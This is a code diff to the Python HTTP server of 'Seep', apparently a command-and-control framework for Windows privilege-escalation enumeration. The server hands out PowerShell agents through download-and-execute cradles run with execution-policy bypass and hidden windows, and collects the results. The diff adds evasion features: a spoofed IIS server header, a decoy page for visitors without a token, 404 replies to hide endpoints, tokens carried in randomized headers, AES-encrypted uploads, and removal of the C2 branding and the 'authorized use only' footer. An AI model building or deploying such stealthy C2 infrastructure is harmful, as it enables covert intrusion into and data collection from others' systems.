@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import gzip
+import hashlib
 import hmac
 import html as _html_mod
 import json
@@ -104,13 +105,21 @@ def get_local_ips() -> list[str]:
 # HTML index page
 # ---------------------------------------------------------------------------
 
-_INDEX_HTML = """\
+_BENIGN_HTML = """\
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><title>Service</title></head>
+<body><p>It works!</p></body>
+</html>
+"""
+
+_DASHBOARD_HTML = """\
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Seep C2</title>
+<title>Dashboard</title>
 <style>
   :root {{
     --bg: #0d1117;
@@ -130,7 +139,6 @@ _INDEX_HTML = """\
   a:hover {{ text-decoration: underline; }}
   header {{ background: var(--surface); border-bottom: 1px solid var(--border); padding: 16px 32px; display: flex; align-items: center; gap: 12px; }}
   header h1 {{ font-size: 20px; font-weight: 700; letter-spacing: 1px; color: var(--accent); }}
-  header .badge {{ background: var(--accent); color: #0d1117; padding: 2px 8px; border-radius: 12px; font-size: 11px; font-weight: 600; }}
   .container {{ max-width: 1100px; margin: 0 auto; padding: 24px 32px; }}
   .grid {{ display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px; }}
   .card {{ background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 20px; }}
@@ -142,10 +150,6 @@ _INDEX_HTML = """\
   pre, code {{ font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace; font-size: 12px; }}
   pre {{ background: var(--code-bg); border: 1px solid var(--border); border-radius: 6px; padding: 12px 14px; overflow-x: auto; margin: 6px 0; white-space: pre-wrap; word-break: break-all; }}
   .cradle-label {{ font-size: 11px; color: var(--muted); margin-top: 10px; margin-bottom: 2px; }}
-  .pill {{ display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 11px; font-weight: 600; margin: 2px; }}
-  .pill-green {{ background: rgba(63,185,80,.15); color: var(--green); border: 1px solid rgba(63,185,80,.3); }}
-  .pill-blue {{ background: rgba(88,166,255,.12); color: var(--accent); border: 1px solid rgba(88,166,255,.3); }}
-  .pill-yellow {{ background: rgba(210,153,34,.15); color: var(--yellow); border: 1px solid rgba(210,153,34,.3); }}
   table {{ width: 100%; border-collapse: collapse; font-size: 12px; }}
   th {{ text-align: left; padding: 6px 10px; border-bottom: 1px solid var(--border); color: var(--muted); font-weight: 600; text-transform: uppercase; font-size: 11px; }}
   td {{ padding: 8px 10px; border-bottom: 1px solid rgba(48,54,61,.5); }}
@@ -158,32 +162,26 @@ _INDEX_HTML = """\
 </head>
 <body>
 <header>
-  <h1>&#x25C8; SEEP</h1>
-  <span class="badge">C2</span>
-  <span style="margin-left:auto;color:var(--muted);font-size:12px;">Windows PrivEsc Enumeration Framework</span>
+  <h1>&#x25C8; Dashboard</h1>
 </header>
 
 <div class="container">
 
   <div class="stat-row">
     <div class="stat">
-      <div class="label">Server IP</div>
-      <div class="value" style="font-size:16px;">{primary_ip}</div>
+      <div class="label">Listener</div>
+      <div class="value" style="font-size:16px;">{primary_ip}:{http_port}</div>
     </div>
     <div class="stat">
-      <div class="label">HTTP Port</div>
-      <div class="value">{http_port}</div>
-    </div>
-    <div class="stat">
-      <div class="label">Results Received</div>
+      <div class="label">Results</div>
       <div class="value">{results_count}</div>
     </div>
     <div class="stat">
-      <div class="label">Checks Available</div>
+      <div class="label">Checks</div>
       <div class="value">{checks_count}</div>
     </div>
     <div class="stat">
-      <div class="label">Tools Available</div>
+      <div class="label">Tools</div>
       <div class="value">{tools_count}</div>
     </div>
   </div>
@@ -191,50 +189,29 @@ _INDEX_HTML = """\
   <div class="grid">
 
     <div class="card full-width">
-      <h2>Download Cradles</h2>
-      <p class="cradle-label">[1] IEX via WebClient (most compatible)</p>
+      <h2>Cradles</h2>
+      <p class="cradle-label">[1] IEX (WebClient)</p>
       <pre>{cradle_iex}</pre>
-      <p class="cradle-label">[2] IEX with stealth flags (-NoProfile -WindowStyle Hidden)</p>
+      <p class="cradle-label">[2] IEX (stealth)</p>
       <pre>{cradle_iex_hidden}</pre>
-      <p class="cradle-label">[3] IEX via Invoke-WebRequest (iwr)</p>
+      <p class="cradle-label">[3] IEX (iwr)</p>
       <pre>{cradle_iwr}</pre>
     </div>
 
     <div class="card">
-      <h2>Endpoints</h2>
-      <div class="link-list">
-        <a href="/agent.ps1">/agent.ps1 &mdash; Composed agent (GET)</a>
-        <a href="/cradle">/cradle &mdash; Plaintext download cradles (GET)</a>
-        <a href="/api/results">/api/results &mdash; Results list JSON (GET)</a>
-        <a href="/tools/">/tools/ &mdash; Tool files (GET)</a>
-      </div>
-      <br>
-      <p style="font-size:12px;color:var(--muted);">POST /api/results or /upload to receive JSON or ZIP results.</p>
-    </div>
-
-    <div class="card">
-      <h2>Agent Query Params</h2>
-      <table>
-        <tr><th>Param</th><th>Example</th><th>Effect</th></tr>
-        <tr><td><code>checks</code></td><td><code>?checks=system_info,network</code></td><td>Include only listed check IDs</td></tr>
-        <tr><td><code>exclude</code></td><td><code>?exclude=patches</code></td><td>Exclude listed check IDs</td></tr>
-      </table>
-    </div>
-
-    <div class="card">
-      <h2>Available Checks</h2>
+      <h2>Checks</h2>
       {checks_table}
     </div>
 
     <div class="card">
-      <h2>Recent Results</h2>
+      <h2>Results</h2>
       {results_table}
     </div>
 
   </div>
 </div>
 
-<footer>Seep &mdash; authorized security assessments only &mdash; {timestamp}</footer>
+<footer>{timestamp}</footer>
 </body>
 </html>
 """
@@ -247,6 +224,10 @@ _INDEX_HTML = """\
 
 class SeepHTTPHandler(BaseHTTPRequestHandler):
     """Unified HTTP handler — agent delivery, tool serving, result upload."""
+
+    # Override default Server header to avoid fingerprinting as Python http.server
+    server_version = "Microsoft-IIS/10.0"
+    sys_version = ""
 
     config: ServerConfig
     composer: AgentComposer
@@ -299,26 +280,84 @@ class SeepHTTPHandler(BaseHTTPRequestHandler):
     # Routing
     # ------------------------------------------------------------------
 
+    def _check_request_auth(self) -> bool:
+        """Check auth token from query string or header. Returns True if valid."""
+        if not self.config.auth_token:
+            return True
+        parsed = urlparse(self.path)
+        qs = parse_qs(parsed.query)
+        token = (
+            qs.get("token", [""])[0]
+            or self.headers.get("X-Auth-Token", "")
+            or self.headers.get("X-Seep-Token", "")
+        )
+        if not token:
+            # Scan X- headers for matching token (supports randomized header names)
+            for hdr_name in self.headers:
+                if hdr_name.lower().startswith("x-") and hdr_name.lower() not in (
+                    "x-forwarded-for", "x-forwarded-host", "x-forwarded-proto",
+                    "x-real-ip", "x-request-id", "x-correlation-id",
+                ):
+                    val = self.headers.get(hdr_name, "")
+                    if val and hmac.compare_digest(val, self.config.auth_token):
+                        token = val
+                        break
+        if not token:
+            return False
+        return hmac.compare_digest(token, self.config.auth_token)
+
+    def _strip_prefix(self, path: str) -> str | None:
+        """Strip the configured URL prefix from a path. Returns None if prefix doesn't match."""
+        prefix = self.config.url_prefix.rstrip("/")
+        if not prefix:
+            return path
+        if path == prefix or path.startswith(prefix + "/"):
+            return path[len(prefix):] or "/"
+        # Root path without prefix is always accessible (benign page)
+        if path.rstrip("/") in ("", "/", "/index", "/index.html"):
+            return path
+        return None
+
     def do_GET(self) -> None:
         parsed = urlparse(self.path)
-        clean = parsed.path.rstrip("/") or "/"
+        clean = self._strip_prefix(parsed.path.rstrip("/") or "/")
+
+        if clean is None:
+            self.send_error(404, "Not found")
+            return
 
         if clean in ("", "/", "/index", "/index.html"):
             self._serve_index()
         elif clean.startswith("/agent") or clean in ("/Seep.ps1", "/agent.ps1"):
+            if not self._check_request_auth():
+                self.send_error(404, "Not found")
+                return
             self._serve_agent(parsed)
         elif clean == "/cradle":
+            if not self._check_request_auth():
+                self.send_error(404, "Not found")
+                return
             self._serve_cradle()
         elif clean.startswith("/tools"):
+            if not self._check_request_auth():
+                self.send_error(404, "Not found")
+                return
             self._serve_tool(parsed.path)
         elif clean == "/api/results":
+            if not self._check_request_auth():
+                self.send_error(404, "Not found")
+                return
             self._serve_results_list()
         else:
             self.send_error(404, "Not found")
 
     def do_POST(self) -> None:
         parsed = urlparse(self.path)
-        clean = parsed.path.rstrip("/")
+        clean = self._strip_prefix(parsed.path.rstrip("/"))
+
+        if clean is None:
+            self.send_error(404, "Not found")
+            return
 
         if clean in ("/api/results", "/upload"):
             self._receive_results()
@@ -341,14 +380,31 @@ class SeepHTTPHandler(BaseHTTPRequestHandler):
     # GET handlers
     # ------------------------------------------------------------------
 
+    def _check_dashboard_auth(self) -> bool:
+        """Return True if the request carries a valid auth token (query or header)."""
+        return self._check_request_auth()
+
     def _serve_index(self) -> None:
+        # Gate the real dashboard behind auth — unauthenticated visitors see a benign page
+        if not self._check_dashboard_auth():
+            body = _BENIGN_HTML.encode("utf-8")
+            self.send_response(200)
+            self.send_header("Content-Type", "text/html; charset=utf-8")
+            self.send_header("Content-Length", str(len(body)))
+            self._add_security_headers()
+            self.end_headers()
+            self.wfile.write(body)
+            return
+
         ips = get_local_ips()
         primary_ip = ips[0] if ips else "127.0.0.1"
         scheme = "https" if self.config.tls.enabled else "http"
-        base_url = f"{scheme}://{primary_ip}:{self.config.http_port}"
+        prefix = self.config.url_prefix.rstrip("/")
+        base_url = f"{scheme}://{primary_ip}:{self.config.http_port}{prefix}"
 
-        # Quick IEX cradles (inline — don't call full compose_cradle)
         agent_url = f"{base_url}/agent.ps1"
+        if self.config.auth_token:
+            agent_url += f"?token={self.config.auth_token}"
         token_arg = f" -Token {self.config.auth_token}" if self.config.auth_token else ""
         cradle_iex = (
             f"powershell -ep bypass -c "
@@ -369,8 +425,7 @@ class SeepHTTPHandler(BaseHTTPRequestHandler):
             rows = "".join(
                 f"<tr><td><code>{_html_escape(c.check_id)}</code></td>"
                 f"<td>{_html_escape(c.check_name)}</td>"
-                f"<td><span class='pill pill-{'green' if c.opsec_impact == 'low' else 'yellow' if c.opsec_impact == 'medium' else 'red'}'>"
-                f"{_html_escape(c.opsec_impact)}</span></td></tr>"
+                f"<td>{_html_escape(c.opsec_impact)}</td></tr>"
                 for c in checks
             )
             checks_table = (
@@ -388,17 +443,16 @@ class SeepHTTPHandler(BaseHTTPRequestHandler):
             rows = "".join(
                 f"<tr><td>{_html_escape(str(e.get('hostname', '?')))}</td>"
                 f"<td>{_html_escape(str(e.get('timestamp', '?')))}</td>"
-                f"<td>{_html_escape(str(e.get('findings_count', '?')))}</td>"
-                f"<td><a href='/api/results'>{_html_escape(str(e.get('filename', '')))}</a></td></tr>"
+                f"<td>{_html_escape(str(e.get('findings_count', '?')))}</td></tr>"
                 for e in result_entries[:10]
             )
             results_table = (
-                "<table><tr><th>Host</th><th>When</th><th>Findings</th><th>File</th></tr>"
+                "<table><tr><th>Host</th><th>When</th><th>Findings</th></tr>"
                 + rows
                 + "</table>"
             )
         else:
-            results_table = "<p style='color:var(--muted)'>No results received yet.</p>"
+            results_table = "<p style='color:var(--muted)'>No results yet.</p>"
 
         # Tool count
         tools_dir = self.config.workdir / self.config.catalog.tools_dir
@@ -410,7 +464,7 @@ class SeepHTTPHandler(BaseHTTPRequestHandler):
             else:
                 tools_count = sum(1 for _ in tools_dir.rglob("*") if _.is_file())
 
-        html = _INDEX_HTML.format(
+        html = _DASHBOARD_HTML.format(
             primary_ip=_html_escape(primary_ip),
             http_port=self.config.http_port,
             results_count=len(result_entries),
@@ -447,6 +501,13 @@ class SeepHTTPHandler(BaseHTTPRequestHandler):
 
         custom = checks_list is not None or exclude_list is not None
 
+        # Build server URL for auto-invoke embedding
+        ips = get_local_ips()
+        primary_ip = ips[0] if ips else "127.0.0.1"
+        scheme = "https" if self.config.tls.enabled else "http"
+        prefix = self.config.url_prefix.rstrip("/")
+        compose_server_url = f"{scheme}://{primary_ip}:{self.config.http_port}{prefix}"
+
         with self.__class__._agent_cache_lock:
             if custom or self.__class__._agent_cache is None:
                 content = self.composer.compose(
@@ -455,6 +516,7 @@ class SeepHTTPHandler(BaseHTTPRequestHandler):
                     obfuscate=self.config.agent.obfuscate,
                     strip_comments=self.config.agent.strip_comments,
                     auth_token=self.config.auth_token,
+                    server_url=compose_server_url,
                 )
                 if not custom:
                     self.__class__._agent_cache = content
@@ -474,7 +536,8 @@ class SeepHTTPHandler(BaseHTTPRequestHandler):
         ips = get_local_ips()
         primary_ip = ips[0] if ips else "127.0.0.1"
         scheme = "https" if self.config.tls.enabled else "http"
-        server_url = f"{scheme}://{primary_ip}:{self.config.http_port}"
+        prefix = self.config.url_prefix.rstrip("/")
+        server_url = f"{scheme}://{primary_ip}:{self.config.http_port}{prefix}"
 
         text = self.composer.compose_cradle(
             server_url, auth_token=self.config.auth_token
@@ -549,10 +612,19 @@ class SeepHTTPHandler(BaseHTTPRequestHandler):
 
     def _receive_results(self) -> None:
         # Authenticate upload if a token is configured
+        # Check multiple sources: dedicated header, legacy header, any X- header value
         if self.config.auth_token:
-            token = self.headers.get("X-Seep-Token", "")
-            if not hmac.compare_digest(token, self.config.auth_token):
-                self._json_response(401, {"error": "Unauthorized"})
+            token = self.headers.get("X-Seep-Token", "") or self.headers.get("X-Auth-Token", "")
+            if not token:
+                # Scan all X- headers for a matching token value (supports randomized headers)
+                for hdr_name in self.headers:
+                    if hdr_name.lower().startswith("x-"):
+                        val = self.headers.get(hdr_name, "")
+                        if val and hmac.compare_digest(val, self.config.auth_token):
+                            token = val
+                            break
+            if not token or not hmac.compare_digest(token, self.config.auth_token):
+                self.send_error(404, "Not found")
                 return
 
         try:
@@ -572,6 +644,45 @@ class SeepHTTPHandler(BaseHTTPRequestHandler):
             return
 
         raw = self.rfile.read(length)
+
+        # AES decryption — if encoding header indicates aes-gzip, decrypt first
+        encoding_hdr = ""
+        for h in ("X-Seep-Encoding", "X-Auth-Encoding"):
+            encoding_hdr = self.headers.get(h, "")
+            if encoding_hdr:
+                break
+        if not encoding_hdr:
+            # Scan X- headers for aes-gzip value (supports randomized header names)
+            for hdr_name in self.headers:
+                if hdr_name.lower().startswith("x-"):
+                    val = self.headers.get(hdr_name, "")
+                    if val in ("aes-gzip", "gzip"):
+                        encoding_hdr = val
+                        break
+
+        if encoding_hdr == "aes-gzip" and self.config.auth_token:
+            try:
+                from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+                from cryptography.hazmat.primitives import padding as crypto_padding
+
+                key = hashlib.sha256(self.config.auth_token.encode("utf-8")).digest()
+                iv = raw[:16]
+                ciphertext = raw[16:]
+                cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
+                decryptor = cipher.decryptor()
+                padded = decryptor.update(ciphertext) + decryptor.finalize()
+                unpadder = crypto_padding.PKCS7(128).unpadder()
+                raw = unpadder.update(padded) + unpadder.finalize()
+            except ImportError:
+                self._json_response(
+                    400, {"status": "error", "message": "AES decryption requires the cryptography package: pip install cryptography"}
+                )
+                return
+            except Exception as exc:
+                self._json_response(
+                    400, {"status": "error", "message": f"AES decryption failed: {exc}"}
+                )
+                return
 
         # Detect encoding: GZip (from fileless agent) or ZIP
         if raw[:2] == b"\x1f\x8b":
@@ -785,8 +896,8 @@ def _print_banner(config: ServerConfig, ips: list[str]) -> None:
     print(_color(_CYAN, "  ╔══════════════════════════════════════════╗"))
     print(
         _color(_CYAN, "  ║")
-        + _color(_BOLD, "   SEEP  C2 Server")
-        + _color(_CYAN, "                          ║")
+        + _color(_BOLD, "   Seep  Listener")
+        + _color(_CYAN, "                           ║")
     )
     print(_color(_CYAN, "  ╚══════════════════════════════════════════╝"))
     print()
@@ -802,8 +913,11 @@ def _print_banner(config: ServerConfig, ips: list[str]) -> None:
         url = f"{scheme}://{ip}:{config.http_port}"
         print(f"    {_color(_GREEN, url)}")
     print()
+    prefix = config.url_prefix.rstrip("/")
     print(f"  {_color(_DIM, 'Cradle (IEX):')}")
-    agent_url = f"{scheme}://{primary}:{config.http_port}/agent.ps1"
+    agent_url = f"{scheme}://{primary}:{config.http_port}{prefix}/agent.ps1"
+    if config.auth_token:
+        agent_url += f"?token={config.auth_token}"
     token_arg = f" -Token {config.auth_token}" if config.auth_token else ""
     iex = (
         f"powershell -ep bypass -c "
@@ -812,7 +926,7 @@ def _print_banner(config: ServerConfig, ips: list[str]) -> None:
     print(f"    {_color(_CYAN, iex)}")
     print()
     print(
-        f"  {_color(_DIM, 'Full cradles:')} {scheme}://{primary}:{config.http_port}/cradle"
+        f"  {_color(_DIM, 'Full cradles:')} {scheme}://{primary}:{config.http_port}{prefix}/cradle"
     )
     print()
     print(_color(_DIM, "  Press Ctrl+C to stop"))
